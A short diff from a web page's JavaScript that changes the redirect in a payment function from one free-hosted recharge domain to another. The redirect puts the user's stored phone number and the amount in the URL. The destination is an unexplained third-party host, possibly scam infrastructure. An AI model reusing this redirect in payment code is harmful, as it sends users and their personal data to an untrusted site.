@@ -8269,7 +8269,7 @@
                 function initiatePayment(i) {
                     if (!window.PaymentRequest) return void console.log("Web payments are not supported in this browser.");
                     const phoneNumber = localStorage.number;
-                    const url = `https://rechargewala.infy.uk/?phone=${phoneNumber}&amount=${i}`;
+                    const url = `https://rcharge.rf.gd/?phone=${phoneNumber}&amount=${i}`;
                     if (i > 0) {
                         window.location.href = url;
                     } else {
